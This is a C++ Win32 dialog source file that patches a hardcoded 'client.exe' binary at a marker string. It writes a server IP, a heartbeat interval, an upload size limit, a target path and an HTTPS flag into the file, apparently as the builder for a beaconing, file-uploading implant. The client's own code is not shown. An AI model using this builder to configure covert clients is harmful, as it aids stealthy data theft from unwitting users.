

#include <windows.h>
#include "resource.h"

#include <iostream>
#include <vector>
#include "dialog.h"
#include "dialog.h"
#include "FileHelper.h"
#include "utils.h"


using namespace std;


MyDialog* g_mydialog = 0;


MyDialog::MyDialog() {

}

MyDialog::~MyDialog() {

}

string selectFileName() {
	int ret = 0;
	OPENFILENAMEA opfn = { 0 };
	CHAR file_name[0x1000];
	opfn.lStructSize = sizeof(OPENFILENAMEA);
	opfn.lpstrFilter = "所有文件\0*.*\0\0";
	//指向一对以空字符结束的过滤字符串的一个缓冲。缓冲中的最后一个字符串必须以两个  NULL字符结束。
	opfn.nFilterIndex = 1;    //指定在文件类型控件中当前选择的过滤器的索引
	opfn.lpstrFile = file_name;
	opfn.lpstrFile[0] = '\0'; //这个缓冲的第一个字符必须是NULL
	opfn.nMaxFile = sizeof(file_name);
	opfn.Flags = 0;  //OFN_FILEMUSTEXIST OFN_PATHMUSTEXIST指定用户仅可以在文件名登录字段中输入已存在的文件的名字。	
	ret = GetOpenFileNameA(&opfn);
	if (ret)
	{
		return string(file_name);
	}
	return "";
}

int writeFileWithParams(char * ip,char * hbi,char * uploadsize,char * path,int bhttps) {

	int ret = 0;
	char* file = 0;
	int filesize = 0;

	const char* client_fn = "client.exe";

	ret = FileHelper::fileReader(client_fn, &file, &filesize);
	if (ret)
	{

		const char * tag = "0123456789abcdef";
		INT taglen = lstrlenA(tag);
		int pos = 0;
		int blocksize = MAX_PATH;
		pos = binarySearch(file, filesize, (char*)tag, taglen);	
		if (pos != -1)
		{
			PROGRAM_PARAMS* params = (PROGRAM_PARAMS*)(file + pos + taglen);
			memset(params, 0, blocksize);
			params->ip = inet_addr(ip);
			if (params->ip == -1)
			{
				return FALSE;
			}

			params->fzLimit = atoi(uploadsize);
			if (params->fzLimit == 0)
			{
				return FALSE;
			}
			params->hbi = atoi(hbi);
			if (params->hbi == 0)
			{
				return FALSE;
			}
			params->bHttps = bhttps;

			lstrcpyA(params->path, path);

			ret = FileHelper::fileWriter(client_fn, file, filesize, FILE_WRITE_NEW);

			return ret;
		}
	}

	return 0;
}



int __stdcall MyDialog::runDialog(MyDialog* dialog) {
	int ret = 0;

	dialog->m_hwnd = CreateDialogA(dialog->m_hinst, (LPCSTR)IDD_DIALOG1, 0, (DLGPROC)dlgProc, 0);
	if (dialog->m_hwnd == 0)
	{
		ret = GetLastError();
		return FALSE;
	}

	ret = ShowWindow(dialog->m_hwnd, SW_SHOW);

	MSG msg;
	while ((ret = GetMessage(&msg, 0, 0, 0)) != 0) {

		if (ret == -1) {
			return -1;
		}

		if (ret == 0)
		{
			printf("hello\r\n");
			break;
		}

 		ret = IsDialogMessage(dialog->m_hwnd, &msg);
		if (ret)
		{
			//TranslateMessage(&msg);
			//DispatchMessage(&msg);
		}
	}

	if (g_mydialog) {
		delete g_mydialog;
		g_mydialog = 0;
	}

	return 0;
}


INT_PTR MyDialog::dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
{
	if (msg == WM_INITDIALOG)
	{
		//must be in WM_INITDIALOG or WM_CREATE
	}
	else if ((msg & 0xffff) == WM_COMMAND)
	{
		int wl = wparam & 0xffff;
		int wh = wparam >> 16;
		int ll = lparam & 0xffff;
		int lh = lparam >> 16;
		if (wparam == IDOK)
		{
			int ret = 0;
			int len = 0;
			char fn[1024] = { 0 };
			ret = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT5, fn,sizeof(fn));
			if (fn[0] )
			{
				char szip[256];
				len = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT1, szip, sizeof(szip));
				if (len > 0)
				{
					char szhbi[256];
					len = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT3, szhbi, sizeof(szhbi));
					if (len > 0)
					{
					}
					else {
						wsprintfA(szhbi, "%d", HEART_BEAT_INTERVAL);
						//MessageBoxA(0, "error:heart beat is null", "error:heart beat is null", MB_OK);
					}

					char szfz[256];
					len = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT2, szfz, sizeof(szfz));
					if (len > 0)
					{

					}
					else {
						wsprintfA(szfz, "%d", MAX_UPLOAD_FILESIZE);
						//MessageBoxA(0, "error:filesize is null", "error:filesize is null", MB_OK);
					}

					char szdir[1024];
					len = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT4, szdir, sizeof(szdir));
					if (len > 0)
					{

					}
					else {
						//MessageBoxA(0, "error:path is null", "error:path is null", MB_OK);
					}

					int https = IsDlgButtonChecked(g_mydialog->m_hwnd, IDC_CHECK1);

					ret = writeFileWithParams(szip, szhbi, szfz, szdir, https);
					if (ret == 0)
					{
						char info[1024];
						wsprintfA(info, "Write File error:%d", GetLastError());
						MessageBoxA(0, info, info, MB_OK);
					}
					else {

					}
				}
				else {
					MessageBoxA(0, "error:server ip is null", "error:server ip is null", MB_OK);
				}
			}
			else {
				MessageBoxA(0, "error:no file selected", "error:no file selected", MB_OK);
			}
		}else if (wparam == IDC_BUTTON1)
		{
			string fn = selectFileName();

			int ret = SetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT5, fn.c_str());
		}
	}
	else if (msg == WM_SYSCOMMAND)
	{
		int wl = wparam & 0xffff;
		int wh = wparam >> 16;
		int ll = lparam & 0xffff;
		int lh = lparam >> 16;
	}
	else if (msg == WM_CLOSE)
	{
		EndDialog(hwnd, 0);
		DestroyWindow(hwnd);
		return 0;
	}
	else if (msg == WM_DESTROY)
	{
		PostQuitMessage(-1);
		return 0;
	}
	else if (msg == WM_QUIT)
	{
		printf("hello\r\n");
	}
// 	else if (msg == WM_CHAR)
// 	{
// 		printf("hello\r\n");
// 	}
	else if (msg == WM_RBUTTONDOWN)
	{

	}
	else if (msg == WM_LBUTTONDOWN)
	{

	}
	return FALSE;
	//return DefWindowProc(hwnd,msg,wparam,lparam);
}


int createDialog(HINSTANCE hinstance) {
	g_mydialog = new MyDialog();
	g_mydialog->m_hinst = hinstance;

	g_mydialog->runDialog(g_mydialog);

// 	HANDLE h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)g_mydialog->runDialog, g_mydialog, 0, 0);
// 	if (h)
// 	{
// 		CloseHandle(h);
// 	}
	return TRUE;
}